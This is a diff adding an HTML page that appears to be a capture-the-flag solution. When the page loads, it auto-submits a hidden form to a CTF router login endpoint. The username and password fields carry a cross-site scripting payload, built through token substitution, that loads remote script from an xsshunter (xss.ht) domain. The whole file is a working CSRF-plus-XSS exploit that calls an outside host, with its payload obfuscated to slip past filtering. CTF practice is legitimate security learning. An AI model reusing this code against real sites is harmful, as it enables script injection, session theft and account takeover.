@@ -1,0 +1,65 @@
+
+<html>
+<head>
+<title>Title of the document</title>
+</head>
+
+<body>
+The content of the document......
+</body>
+
+<Script type="text/javascript">
+
+function post(path, params, method) {
+	//Copied from https://stackoverflow.com/questions/133925/javascript-post-request-like-a-form-submit
+	
+    method = method || "post"; // Set method to post by default if not specified.
+
+    var form = document.createElement("form");
+    form.setAttribute("method", method);
+    form.setAttribute("action", path);
+
+    for(var key in params) {
+        if(params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+
+            form.appendChild(hiddenField);
+        }
+    }
+
+    document.body.appendChild(form);
+    form.submit();
+}
+</script>
+
+
+<Script type="text/javascript">
+	function decode_post_info(text){
+		replace_tokens = ["_X1_","_X2_","_X3_"];
+		replace_values 		= {"_X1_":'<', "_X2_":'>', "_X3_":'"'};
+		
+		var text1 = text;
+		for(var x = 0; x < 3; x = x + 1){
+			var token = replace_tokens[x]
+			var text2 = text1;
+			do{
+				text1 = text2;
+				text2 = text1.replace(token, replace_values[token]);
+			} while (text1 != text2);
+		}
+		return text1;
+	}
+
+var webpage = 'https://router-ui.web.ctfcompetition.com/login';
+var username_post = decode_post_info('_X1_script src=_X3_')
+var xss_name = '<write your xsshunter  name here>';
+var password_post = decode_post_info(xss_name + '.xss.ht_X3__X2__X1_/script_X2_')
+//
+post(webpage, {username:username_post, password: password_post});
+
+</Script>
+
+</html>
